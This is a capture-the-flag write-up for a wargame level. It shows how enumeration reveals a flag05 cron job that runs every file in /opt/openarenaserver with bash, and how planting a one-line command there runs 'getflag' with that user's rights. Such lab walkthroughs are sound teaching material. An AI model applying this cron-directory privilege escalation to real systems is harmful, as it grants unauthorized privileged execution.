# level05 - Crontab privilege escalation

<br>

## Enumeration

```shell
find / -type f -exec ls -l {} \; 2>/dev/null | grep -E 'flag05|level05'
```

<br>

## Summary

After the enumeration above, we find two interesting files:

```shell
~$ find / -type f -exec ls -l {} \; 2>/dev/null | grep -E 'flag05|level05'

...
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-rw-r--r--+ 1 root mail 58 Jul  8 16:39 /var/mail/level05
...
```
<br>

The first file (`/usr/sbin/openarenaserver`) is a binary and, as we can see using `hexdump`, it’s clearly an shell script which take every line in every file in `/opt/openarenaserver/` for execute them with `bash -x`.

```shell
~$ hexdump -C /usr/sbin/openarenaserver

00000000  23 21 2f 62 69 6e 2f 73  68 0a 0a 66 6f 72 20 69  |#!/bin/sh..for i|
00000010  20 69 6e 20 2f 6f 70 74  2f 6f 70 65 6e 61 72 65  | in /opt/openare|
00000020  6e 61 73 65 72 76 65 72  2f 2a 20 3b 20 64 6f 0a  |naserver/* ; do.|
00000030  09 28 75 6c 69 6d 69 74  20 2d 74 20 35 3b 20 62  |.(ulimit -t 5; b|
00000040  61 73 68 20 2d 78 20 22  24 69 22 29 0a 09 72 6d  |ash -x "$i")..rm|
00000050  20 2d 66 20 22 24 69 22  0a 64 6f 6e 65 0a        | -f "$i".done.|
0000005e
```
We could say that we can simply put a `su - flag` and escalate the privilege in this way... but the binary does not have the necessary rights, it would be necessary to be able to launch it with root rights , or with user flag05. So let’s look second file

<br>

This second one is actually a “hint”. I mean by this ways that the information should not be here in this form. It just a line from the `crontab` file and level05 user haven’t a `crontab` file set ! So we deduce that it is a job from an other user who execute a `su -c ... - flag05` , it can be the flag05 user’s crontab !
```shell
~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

<br>


## Exploit

As we see above, we just have to put the command that we want to execute
by the `cron daemon`:

```shell
echo "getflag > /tmp/exploit05" > /opt/openarenaserver/exploit
```
Wait 2 minutes and look at the file `/tmp/exploit05` … we got it !
> On this exploit, we ran directly command `getflag` from flag05's user. So, just log on level06 user.
